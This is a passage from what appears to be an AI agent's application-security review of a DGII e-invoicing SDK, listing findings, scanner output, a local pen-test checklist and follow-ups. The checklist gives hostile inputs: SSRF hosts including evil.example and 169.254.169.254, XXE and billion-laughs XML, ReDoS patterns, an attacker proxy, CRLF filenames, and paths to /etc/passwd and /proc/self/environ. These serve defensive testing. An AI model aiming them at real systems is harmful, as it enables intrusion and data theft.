**Where.** `client.ts:192` `this.validateBeforeSend = options.validateBeforeSend ?? false;` and `client.py:173`. The gate only runs when the consumer opts in (`client.ts:556-572`, `client.py:386-406`). The artifacts do ship everything needed: `packages/typescript/dist` after `bun run build` contains 12 `.xsd` + `MANIFEST.json`, and the wheel contains `py_dgii_ecf/schemas/*.xsd` + `py_dgii_ecf/py.typed` (`validation.ts:21-25`, `validation.py:24`).

**Consumer-visible impact.** The safe path (validate before transmit) is a flag nobody sets, so the common integration ships schema-invalid documents and learns from DGII's rejection. This is the difference between a local `VALIDATION` `Err` naming the offending element and an opaque DGII message after the e-NCF is committed. The reason for the default is defensible in TS (the gate shells out to `xmllint` — `validation.ts:139`), but the *unavailability* is already fail-closed (`validation.ts:128-136` returns `Err`, `validation.py:96-106` returns `Err` for a non-compiling schema), so defaulting to "on" is safe: a missing `xmllint` yields a clear `Err` rather than a silent skip.

**Fix.** Default to `true` in both packages once the engine question is settled (bundle a WASM XSD engine in TS, or keep `xmllint` and keep the `ENOENT` message actionable, which it already is). If the default has to stay opt-in for a release, make the opt-out *named* rather than implicit: `EcfOptions.requireValidDocument` (default `true`) so a consumer reads `requireValidDocument: false` in their own diff, and keep the "no logging" property intact — no warning to swallow.

**How to verify.** A schema-invalid document must return `Err('VALIDATION')` with `validateBeforeSend` omitted.

---

## F-APPSEC-13 — Money exposed as `number`/`float` on the public surface

**Severity** LOW · **CWE-681** (incorrect conversion between numeric types) · **Packages** TS + PY · **Verified by running (PY) / reading (TS)**

**Where.**

- `packages/typescript/src/types.ts:59-60` — `montoTotal?: number; totalITBIS?: number;` on `InquiryStatusResponse`.
- `packages/python/src/py_dgii_ecf/types.py:350-351,369-373` — `monto_total: float | None`, `total_itbis: float | None` via `_as_float` (`:180-190`).
- `packages/typescript/src/utils.ts:24-30` — `generateFcQRCodeURL(…, montototal: number, …)`.
- `packages/python/src/py_dgii_ecf/utils.py:29-32` — `generate_fc_qr_code_url(…, montototal: int | float | str, …)`, while its sibling `generate_ecf_qr_code_url` correctly takes `str` (`:50`).

**Consumer-visible impact.** `AGENTS.md` states the invariant flatly: money is never floating point; TS keeps `string`, Python `Decimal`. These six signatures break it, and the FC QR helper is the dangerous one: a consumer passes `order.total` (a float) and the QR code that goes on a fiscal receipt encodes `250000.00000000003` or `1234.5600000000001`, so DGII's verification portal computes a different total than the signed XML. It is also a silent parity gap — the same helper in TS and PY accepts a float, while every other money parameter is a decimal string.

**Fix.** `montototal: string` / `montototal: Decimal | str` (reject `float`/`int` with a type error, or format via `Decimal(str(x))` and document the lossy path); `montoTotal: string` / `Decimal | None` on `InquiryStatusResponse`, with `compareDecimal`/`compare_decimal` for comparisons. Keep the TS `number` only if a `RoundedMoney` brand is introduced.

**How to verify.** A type-level test (`expectTypeOf`/`assert_type`) plus a runtime probe: `generate_fc_qr_code_url('1','E1', 250000.1, 'ABC', Environment.PROD)` must not contain a float artefact.

---

## F-APPSEC-14 — Python `Signature(...)` / `from_p12(...)` raise; the safe twin is the lesser-known name

**Severity** LOW · **CWE-393** (return of wrong status code) · **Package** PY · **Verified by running**

**Where.** `packages/python/src/py_dgii_ecf/signing.py:62-72` — `__init__` calls `serialization.load_pem_private_key` and `x509.load_pem_x509_certificate`, both of which raise `ValueError`; `:65-66` raises `ValueError("DGII signing requires an RSA private key")`. `from_p12` (`:74-89`) raises `OSError`, `ValueError`, `UnsupportedAlgorithm`. The `Result` twin is `try_from_p12` (`:91-110`), a name a consumer has to discover.

```
[F] Signature(bad pem) -> RAISES ValueError | try_from_p12 exists as the Result twin
```

TS `new Signature(key, cert)` validates nothing and defers failure into `signXml`, which returns `Err('SIGNING')` (`signing.ts:76-133`) — i.e. TS honours the contract and PY does not.

**Fix.** Make `Signature.__init__` non-raising (store the PEMs, validate inside `sign_xml`/`from_p12`) and return `Err(code: 'CERTIFICATE'|'SIGNING')`; keep `from_p12` as an alias of `try_from_p12` and add `from_p12_unchecked` for anyone who genuinely wants the exception. Add `keys_match` validation at the same time (see F-APPSEC-06).

**How to verify.** The `[F]` probe must print `Err`, and `mypy --strict` must stay green.

---

## F-APPSEC-15 — `getXmlFromBodyResponse(body, lastTagName)` interpolates into a regex

**Severity** LOW · **CWE-1333** + **CWE-625** (permissive regex) · **Packages** TS + PY · **Verified by reading**

**Where.** `packages/typescript/src/utils.ts:96-100` — `body.match(new RegExp(\`<\\?xml[\\s\\S]*?<\\/${lastTagName}>\`))`; `packages/python/src/py_dgii_ecf/utils.py:84-89` — `re.search(rf"<\?xml[\s\S]*?</{last_tag_name}>", body)`. `lastTagName` is a public parameter; neither package escapes it.

**Consumer-visible impact.** A consumer that derives the tag from a received document type (a plausible refactor: "pass the root element through") lets the *body* influence the *pattern*: `lastTagName = '(a+)+$'` compiles a catastrophic pattern; `'[` throws `SyntaxError` in TS (an exception from a `Result`-free helper, exported publicly). Impact is bounded — the default `'ACECF'` is safe and the helper is not on the send path — hence LOW.

**Fix.** `escapeRegExp(lastTagName)` / `re.escape(last_tag_name)`, or replace the regex with `indexOf` on the closing tag. Better: parse with the same hardened parser and serialize the root element.

**How to verify.** `getXmlFromBodyResponse('<xml/>', '[')` must return `undefined` rather than throw.

---

## F-APPSEC-16 — `xml-js` does not escape `<` in `_attributes` values

**Severity** LOW · **CWE-116** (improper output encoding) · **Package** TS · **Verified by running**

**Where.** `packages/typescript/src/transformer.ts:117-146` (`json2xml` → `convert.js2xml`). Element text **is** escaped correctly (verified: `ACME &lt;/RazonSocialComprador&gt;…`), but attribute values are not:

```
<ECF><a nota="x&quot; y='z' <inject>">v</a></ECF>
```

Python is safe by construction (`etree.Element`/`element.set`, `transformer.py:122-160`).

**Consumer-visible impact.** A consumer that carries data in `_attributes` (the documented compact shape, `transformer.ts:110-115`) produces XML that `parseStrict` then rejects (`INVALID_XML`) or that another parser mangles — a signing failure or, worse, a document whose attribute value changes meaning between producer and verifier. Element **names** from JSON keys are equally unescaped (`<ECF><<evil/>>x</<evil/>>`), so a consumer building element names from data injects structure.

**Fix.** Post-process attributes through a strict escaper, or build the DOM with a real serializer (`@xmldom/xmldom`'s `createElement`/`setAttribute`) instead of `xml-js`. Validate that every key is a legal `NCName` and every `_attributes` key a legal `Name` before serializing, returning `Err('INVALID_XML')`.

**How to verify.** `/tmp/xmljs-probe2.mjs` must show `&lt;` in the attribute value and an `Err` for a non-`NCName` key.

---

## F-APPSEC-17 — Reception routing bypassable: `sendSummary`/`sendElectronicDocument`/`HttpClient` skip the rule

**Severity** LOW · **CWE-20** · **Packages** TS + PY · **Verified by running**

**Where.** Only `sendDocument`/`send_document` applies `resolveReceptionRoute` (`client.ts:611-632`, `client.py:427-452`). `sendSummary` (`client.ts:588-599`, `client.py:414-425`) and `sendElectronicDocument` (`client.ts:545-586`, `client.py:375-412`) accept any root and post it to their fixed endpoint. `HttpClient` is exported from both indexes (`index.ts:6`, `__init__.py:31-36`) and takes a full URL — TS even has an explicit `absoluteUrl` switch (`http.ts:113`).

```
[D] sendSummary(ECF root) -> Ok — posted an ECF to recepcionfc         # both packages
[E] HttpClient hand-built URL -> Ok — routing rule fully bypassed      # both packages
```

**Consumer-visible impact.** `AGENTS.md`: "Don't hardcode the endpoint at call sites" — but the types let you do exactly that, and the method names read as the natural choice ("I have a summary, call `sendSummary`"). An E32 below RD$250,000 sent through `sendElectronicDocument` bypasses the 250 000 routing gate entirely. DGII rejects it, so the damage is a burned sequence rather than a wrong submission — hence LOW, but it is the kind of footgun the type system could remove.

**Fix.** Have `sendSummary`/`send_summary` assert `root == 'RFCE'` and `sendElectronicDocument` assert `root == 'ECF'` (plus, for E32, the ≥ 250 000 branch), returning `Err('VALIDATION')` with a hint to use `sendDocument`. Keep `HttpClient` exported but move it behind a `low-level` entry point (or rename to `RawHttpClient` and mark `@internal`) so its use is a visible decision.

**How to verify.** The `[D]` probes must print `Err VALIDATION`.

---

## F-APPSEC-18 — 20 advisories in the TS dependency tree (dev-only); `node-forge` advisories have no fix

**Severity** LOW · **CWE-1395** (dependency on vulnerable third-party component) · **Package** TS · **Verified by running**

**Where.** `bun audit` in `packages/typescript` (see Scanner results). Runtime surface of the *published* artifact is `dist` only, and the flagged packages split as:

| Package | Path | Severities | Reachable from the SDK? |
|---|---|---|---|
| `vitest@2.1.9`, `tinypool@1.1.1`, `vite@5.4.21`, `esbuild@0.27.7/0.21.5`, `@vitest/mocker` | devDependencies | 3 critical, 1 high, 13 moderate, 3 low | No — not in `dist`, not in `files` |
| `node-forge@1.4.2` (direct, runtime) | `certificate.ts` | 1 low, 3 moderate | Not reachable: the SDK uses only `pkcs12FromAsn1`, `privateKeyToPem`, `certificateToPem`, `decode64`; the advisories concern `forge.tls` and `forge.http`, which are never imported. **No patched release exists** (`<=1.4.2` affects all published versions) |

`pip-audit` reports **no known vulnerabilities** for the Python tree; `httpx2`/`httpcore2` were verified as the genuine `pydantic/httpx2` project (PyPI metadata: author Tom Christie, source `github.com/pydantic/httpx2`) rather than a typosquat, and `uv.lock` pins every one of the 36 packages with `sha256`.

**Consumer-visible impact.** None today for the published artifacts. The development risk is real: `tinypool`'s prototype-pollution-to-RCE is reachable from a locally-running `vitest` UI server, and those tools run in CI on every PR.

**Fix (repo hygiene, not this pipeline's gate).** Bump the `vitest`/`vite` chain (major upgrade; `bun audit fix --latest`), and pin `node-forge` with a documented reachability note in `SECURITY.md` until upstream publishes a fix. Add `bun audit` to `mise run ci` with an allowlist that names the four `node-forge` advisories and their justification.

**How to verify.** `cd packages/typescript && bun audit` → only the `node-forge` entries remain, each matched by an allowlist entry.

---

## Scanner results

### Commands that ran, with output

| # | Command | Result |
|---|---|---|
| 1 | `cd packages/typescript && bunx tsc --noEmit` | **PASS** — exit 0, no diagnostics |
| 2 | `cd packages/python && uv run --with bandit bandit -r src -f txt` | **0 issues** — "Code scanned: 3016 lines… Total issues: Undefined 0, Low 0, Medium 0, High 0" |
| 3 | `cd packages/python && uv run --with pip-audit pip-audit --format=columns` | **No known vulnerabilities found** |
| 4 | `cd packages/typescript && bun audit` | **20 vulnerabilities (3 critical, 1 high, 13 moderate, 3 low)** — full breakdown and reachability in F-APPSEC-18 |
| 5 | `cd packages/python && uv lock --check` | **LOCK OK** — "Resolved 36 packages in 4ms" |
| 6 | `cd packages/typescript && bun run build` | PASS (esbuild warning about `import.meta` in the CJS output, benign: `validation.ts:14-19` short-circuits on `__dirname` first) — `dist/` inspected then **deleted** |
| 7 | `cd packages/python && uv build --out-dir /tmp/py-dist` | PASS — wheel `156.8 KB`, sdist `239.1 KB` |

### Artifact inspection (build outputs, both to scratch and removed/kept outside the repo)

```
packages/typescript/dist  (1.6 MB, 20 files)
  index.js 63.6K  index.cjs 70.6K  index.d.ts 34.4K  index.d.cts 34.4K
  index.js.map 139.7K  index.cjs.map 140.6K
  12 × *.xsd + MANIFEST.json + README.md
  → no tests, no src/, no key material; schemas ship by design (publicDir: 'schemas')

py_dgii_ecf-0.7.2-py3-none-any.whl  (156.8 KB, 37 entries)
  py_dgii_ecf/{__init__,_json,_xml,certificate,cli,client,environment,errors,http,
               py.typed,reception,reconciliation,resilience,result,signing,
               transformer,types,utils,validation}.py
  py_dgii_ecf/schemas/  (12 × .xsd + MANIFEST.json + README.md)
  → py.typed present (PEP 561 OK), MANIFEST.json present, no tests

py_dgii_ecf-0.7.2.tar.gz  (239.1 KB)
  → additionally ships tests/ (20 entries), uv.lock, scripts/verify_signing.py, .python-version
  → no private key material (grep for BEGIN *PRIVATE KEY across the repo: nothing outside node_modules)
```

### Tools unavailable

| Tool | Attempt | Status |
|---|---|---|
| Semgrep | `bunx --bun semgrep --version` | **Unavailable offline** — `error: could not determine executable to run for package semgrep`. Fell back to reading + targeted probes (all F-APPSEC probes) |
| ESLint / Biome | `ls -a packages/typescript` | **No config in the repo**; per the task I did not add dependencies. `tsc --noEmit` is the only static gate available |
| npm audit | — | Not applicable: the repo pins with `bun.lock` (lockfileVersion 2), no `package-lock.json`; `bun audit` covers the same advisories |

### Note on what the scanners cannot see

`bandit` reports zero issues, yet three Python findings in this report are real and reproducible (F-APPSEC-01, -03, -08). Bandit's lxml rules do not flag `etree.fromstring` with an explicitly-constructed parser, and no SAST tool models "the caller passes a hostile URL string" or "this regex is quadratic on a 35 KiB input". The probes are the evidence; the scanner is not.

---

## Pen-test checklist (ordered, local harness only)

Each item states the **expected safe behaviour**. Run against the mock DGII server and the SDK's public API on `127.0.0.1`; **no traffic to `ecf.dgii.gov.do`, `fc.dgii.gov.do` or `statusecf.dgii.gov.do`** (no written authorization — `ledger.md`, "Pen-test authorization scope").

| # | Attack | Expected safe behaviour | Current |
|---|---|---|---|
| 1 | Pass `buyerHost = 'http://127.0.0.1:PORT/'` and capture the request | `Err('VALIDATION')` before any socket; no `Authorization` header ever leaves toward a non-DGII origin | ❌ token + plaintext (F-APPSEC-01) |
| 2 | Pass `buyerHost = 'file:///etc'`, `'//evil.example'`, `'https://user:pw@host'`, `'https://[::1]'`, `'https://169.254.169.254'` | `Err('VALIDATION')` for each; only `https` with a public DNS name accepted | ❌ accepted (F-APPSEC-01) |
| 3 | Buyer host answers `307`/`308` to an internal URL | `Err('HTTP')`, no body replay, internal service sees zero requests | ❌ replayed (F-APPSEC-02, TS) |
| 4 | Buyer host answers `200` with a body that is not JSON / is HTML / is a 5 MB blob | `Err('VALIDATION')` or a bounded `Err('HTTP')`; no unbounded buffering | ⚠️ `readBody` buffers the whole body (`http.ts:202-215`) |
| 5 | Send the same signed document to two different `buyerHost`s | Two transmissions, two `Ok`; the second is not served from the first's cache | ❌ 1 request (F-APPSEC-04) |
| 6 | 16 concurrent `sendElectronicDocument` calls with one document | Exactly one POST; all 16 callers receive the same `Ok` | ⚠️ TS ✅ / PY 1 `Ok` + 15 errors (F-APPSEC-09) |
| 7 | Idempotency store whose `get`/`set`/`delete` raise | `Err('IDEMPOTENCY')`; no exception escapes | ❌ rejects/raises (F-APPSEC-05) |
| 8 | Kill the process between `set(pending)` and the response, then re-send | `Err('IDEMPOTENCY')` telling the caller to reconcile; `reconcileSubmission` clears or confirms | ✅ by design (`client.ts:238-262`, `client.py:264-292`) |
| 9 | Hostile XML: `<![CDATA[` + 20 000 × `<eNCF ` + `]]>`, well-formed, no `<eNCF>` element | Rejection within milliseconds (`Err('VALIDATION')` for the missing e-NCF); no CPU spike | ❌ 8.9 s at 35 KiB, 119.8 s at 120 KiB (F-APPSEC-03) |
| 10 | Hostile XML: 5 MB document, 100 k nested elements, `xml:base`/`xsi:schemaLocation` pointing at `file:///` | Size cap rejects; external references never resolved | ❌ no size cap; external DTD refused by this libxml2 build only (F-APPSEC-03, -08) |
| 11 | Hostile XML: `<!DOCTYPE … [<!ENTITY xxe "EXPANDED">]>` with `&xxe;` in `RNCEmisor` | `Err('INVALID_XML')` in both packages, byte-identical message | ⚠️ PY expands, TS rejects (F-APPSEC-08) |
| 12 | Hostile XML: billion-laughs (5 levels) | `Err('INVALID_XML')`, no memory growth | ✅ on libxml2 2.14 (amplification limit); unproven on older builds (F-APPSEC-08) |
| 13 | Unsigned `<ECF>` (no `<Signature>`) submitted | `Err('VALIDATION')` naming the missing signature; no transmission | ❌ `Ok` (F-APPSEC-07) |
| 14 | Signed document whose `<eNCF>` appears twice (decoy + real) | `Err('VALIDATION')` (ambiguous) or the value from the parsed tree; never a silent first-match | ⚠️ first match wins (F-APPSEC-03/-07 note) |
| 15 | Sign with a certificate expired yesterday / a key that does not match the certificate | `Err('CERTIFICATE')` at construction or authenticate | ❌ signs silently (F-APPSEC-06) |
| 16 | Hostile `.p12`: 0 bytes, 1 MB of random bytes, wrong password, PKCS#12 with only a certificate, encrypted key with an empty passphrase, `CVE`-shaped ASN.1 nesting | `Err('CERTIFICATE')` in both packages; no unbounded memory, no exception escaping `P12Reader`/`get_key_from_file` | ✅ by reading (all paths return `Result`); re-verify after F-APPSEC-14 |
| 17 | Hostile `.p12` path: `../../etc/passwd`, `/dev/zero`, a FIFO, a 10 GB sparse file, a symlink to `/proc/self/environ` | `Err('CERTIFICATE')` (read failure), never a partial credential, never an infinite read | ⚠️ `readFileSync`/`read_bytes` read whatever is there — the SDK trusts the caller's path (acceptable for a library, worth documenting) |
| 18 | Hostile DGII response: `{"estado": 42}`, `null`, `[]`, `""`, `{"estado": " No encontrado "}` on `consultaestado` | `Err('VALIDATION')` — a non-answer must never read as "No encontrado" (which would clear the idempotency lock) | ✅ by reading (`client.ts:675-705`, `client.py:468-488`) and by the parity probe on directory payloads |
| 19 | Hostile response on `consultaresultado`: `{"secuenciaUtilizada": "false"}` (string) | `canReuseSequence` answers `false` — a stringified flag is not evidence of reuse | ✅ by reading (`reconciliation.ts:62-77`) |
| 20 | Redirect chain from the *DGII* endpoint (mock) to a buyer host | Not followed; `Err('HTTP')` | ⚠️ TS follows (F-APPSEC-02) |
| 21 | `HTTPS_PROXY=http://attacker:3128` in the environment | No traffic through an unconfigured proxy; or an explicit, documented opt-in | ❌ PY tunnels through it (F-APPSEC-10) |
| 22 | `Signature(key, cert)` with a 4096-bit RSA key and an EC key | `Err('CERTIFICATE'/'SIGNING')` in both; EC key rejected with a clear message | ⚠️ PY raises `ValueError` (F-APPSEC-14); TS returns `Err` |
| 23 | `fileName` containing `"\r\nContent-Type: text/html"` or `"../../x.xml"` | The multipart filename is escaped; no header/part injection | ✅ verified: undici percent-encodes `"`, CR and LF |
| 24 | Query values containing `&`, `?`, `#`, `%00`, CRLF on every read method | URL-encoded; never a second parameter injected | ✅ `URLSearchParams` (`http.ts:177-190`) / `httpx2` params |
| 25 | Response body containing CRLF + ANSI escapes, surfaced through `DgiiError.message` | Collapsed whitespace, no escape sequences reaching a consumer's log verbatim | ✅ `collapseWhitespace` (`errors.ts:47-48`, `errors.py:56-58`) |
| 26 | `data` field of `DgiiError` with cyclic JSON, 10 MB string, deeply nested object | No stack overflow / unbounded work in `extractDgiiErrorMessage` | ✅ `WeakSet` cycle guard (`errors.ts:98,132,143`), `_MAX_RAW` truncation |
| 27 | Call `send_summary` with an `ECF` root and `send_electronic_document` with an E32 below 250 000 | Both `Err('VALIDATION')` with a hint to use `sendDocument` | ❌ both `Ok` (F-APPSEC-17) |
| 28 | Two different documents sharing one e-NCF, both submitted | The second is refused locally (sequence already used) or flagged for reconciliation | ⚠️ allowed; distinct key because of the hash (see Needs follow-up) |

---

## Coverage

### Checked

- **Public surface, both packages**: every export in `index.ts` (14 modules) and `__init__.py` (`__all__`, 74 names) was read and each item classified as "safe path obvious / footgun". The API-footgun enumeration is the findings table plus the defaults matrix.
- **Defaults**: timeout, retries, backoff, breaker, bulkhead, redirects, TLS, proxy, idempotency, validation, token skew, routing — read in both packages and cross-checked against `project-docs/architecture.md`.
- **Trust boundaries and validation**: caller → URL (`environment.ts`), caller → header (`authHeaders`), caller → multipart filename (escaped, clean), caller → regex (F-APPSEC-03/15), caller → XML parser (F-APPSEC-08), DGII/buyer response → typed model (F-APPSEC-11). No SQL, no shell, no template engine, no HTML output in either package.
- **Money path**: `compareDecimal`/`compare_decimal` are exact and float-free (`reception.ts:64-84`, `reception.py:44-75`); `roundHalfUpToCents` (`transformer.ts:34-55`) and `_round_monetary` (`transformer.py:32-46`) agree on `ROUND_HALF_UP` including `2.675 → 2.68`; no `parseFloat`/`float()` on the request path. The only float surfaces are F-APPSEC-13.
- **Signing**: algorithm constants (`RSA-SHA256`, inclusive C14N 1.0, SHA-256) are identical; no hand-rolled digest; no key material logged; `cleanNodes`/`remove_blank_text` both strip whitespace pre-canonicalization. I did **not** re-run the XMLDSig gate (P0 already recorded it PASS); no signing logic changed.
- **Exception contract**: `grep` for `raise`/`throw`/`assert`/`!` across both `src` trees → three `raise ValueError` (two are programmer errors, one is F-APPSEC-14), one `throw new RangeError` (programmer error), zero `assert`, zero non-null assertions in the SDK's `src`. Every `Result`-returning path was traced for a `catch`-all boundary (`http.ts:289-292`, `http.py:243-265`).
- **Dependencies**: `bun.lock` pins exact versions with integrity for every package; `uv.lock` pins 36 packages with `sha256` and passes `uv check`; `httpx2`/`httpcore2` provenance verified against PyPI; no `peerDependencies`, no optional runtime deps, no post-install scripts in the shipped runtime set.
- **Artifacts**: built and inspected both (sizes and file lists above); `dist/` removed afterwards; wheel and sdist built to `/tmp/py-dist`.
- **Repo hygiene**: no committed `.p12`/`.pem`/private keys outside `node_modules`; `git status` clean apart from this report and the pre-existing untracked `.omp/`.

### Not checked (and why)

- **DGII-host behaviour**: no authorization (`ledger.md` scope table); every network probe used `127.0.0.1` or an injected fake `fetch`/`MockTransport`.
- **Threat modelling** (assets, trust boundaries, STRIDE): P5a's dimension; deliberately not duplicated. Where a design issue had a code-level consequence I cited the code instead.
- **Canonicalization correctness** (the XMLDSig gate): P0 measured PASS at this commit and this dimension has no authority to re-derive it; the TS `xml-crypto`/`libxmlsec1` disagreement risk is documented in `AGENTS.md` and untouched by any finding here.
- **Reliability semantics** (retry classification, breaker tuning, `reconcileSubmission` flow): P3/P4. The two places where a reliability decision has a security consequence (retrying a `5xx` POST after the marker is deleted; no reconciliation gate before retry) are noted in the matrix and cross-referenced, not claimed as this pipeline's findings.
- **Supply chain of the build itself** (CI workflow pinning, `mise` toolcache integrity): P6/P4.
- **`examples/*` projects**: they resolve the SDK by path and add their own lockfiles; only read to learn the documented consumer flow.
- **Semgrep and ESLint**: unavailable offline / not configured (see Scanner results); their absence is why the ReDoS and SSRF classes were found by hand-rolled probes rather than SAST.

---

## Needs follow-up

1. **Decide the `buyerHost` trust model (owner: maintainers, human sign-off).** F-APPSEC-01/-02 need a policy decision, not just code: is a peer host allowed to be private-network, is `http` ever allowed for certification, and how is a peer token scoped? Everything else in this list is mechanical; this one changes the public contract (`buyerHost` gains validation) and belongs in `project-docs/architecture.md` in the same commit.
2. **Breaking-change triage.** F-APPSEC-04 (key includes destination) and F-APPSEC-07 (signed/e-NCF required) turn previously-succeeding calls into `Err`. They must land as a minor with a changelog note (release-please owns the version), or behind an opt-in flag for one release. Coordinate with P10's fix loop.
3. **F-APPSEC-03's fix is two-layered** and should be split: (a) the input size cap is a one-line guard in 6 call sites and can ship immediately; (b) the linear extractor is signing-adjacent (it feeds the idempotency key) and needs the XMLDSig gate plus both packages in the same commit.
4. **F-APPSEC-11 (TS response decoders) is the largest single piece of work** — eight methods, ~a day — and it closes a whole class rather than one finding. It also makes F-APPSEC-01's `urlRecepcion` source trustworthy, so schedule it with item 1.
5. **F-APPSEC-18 needs a policy decision on the dev toolchain**: upgrade `vitest` to v4 (major, touches every test file's imports) or accept the advisory with an allowlist. Recommend a separate PR so the security diff stays reviewable.
6. **Regression tests to add with the fixes** (so P11 can certify closure without re-deriving the probes): hostile-`buyerHost` matrix, `307` redirect, CDATA ReDoS (assert < 50 ms), throwing store, expired certificate, unsigned document, `DOCTYPE` document, 16-thread concurrency, non-string `urlRecepcion`, float money rejection. Each is a two- to ten-line vitest/pytest case; my probe scripts are the reference implementations.
7. **Sequence-reuse gap, flagged to P1/P3 rather than claimed here.** Nothing in either SDK tracks that a *different* document reused an e-NCF: the idempotency key includes the document hash, so document B with document A's e-NCF gets a fresh key and is transmitted (checklist item 28). `reconcileSubmission` can *report* `canReuseSequence` but the SDK never *consults* it before a send. An optional `SequenceLedger` hook (mirroring `IdempotencyStore`) would make "reuse a consumed e-NCF" a library-level refusal; today it is DGII's rejection. This is a design question for the domain owner, not an AppSec fix.
8. **Documentation debt created by this review**: `docs/en/guides/resilience.md` and `docs/es/…` should state the defaults matrix (multi-worker store requirement, no single-flight in Python today, proxy behaviour, redirect policy) so consumers can audit their own integration against it. Docs are mirrored — remember `docs/en/` + `docs/es/`.

---

## Outcome
Outcome: done — P5b application-security review completed; verdict **FAIL** (3 HIGH, 9 MEDIUM, 6 LOW), all findings library-side and fixable in place.

Details: F-APPSEC-01 (token to an unvalidated `buyerHost`), F-APPSEC-02 (TS follows a receiver's `307`) and F-APPSEC-03 (quadratic regex, 35 KiB → 8.9 s) are HIGH; the rest are defaults/parity/exception-contract gaps. Source untouched, `dist/` deleted, wheel/sdist in `/tmp/py-dist`; `bandit` and `pip-audit` clean, `bun audit` 20 advisories (dev-only + unfixable `node-forge`), semgrep unavailable offline. Hand-off item 1 (`buyerHost` trust model) needs human sign-off before P10 acts.

`project-tasks/review-board/reports/p5b-appsec.md` — verdict, defaults matrix, 18 findings with `file:line`/CWE/integration sketch/dual-package fix/verification, scanner results, 28-item local pen-test checklist, coverage, follow-ups.
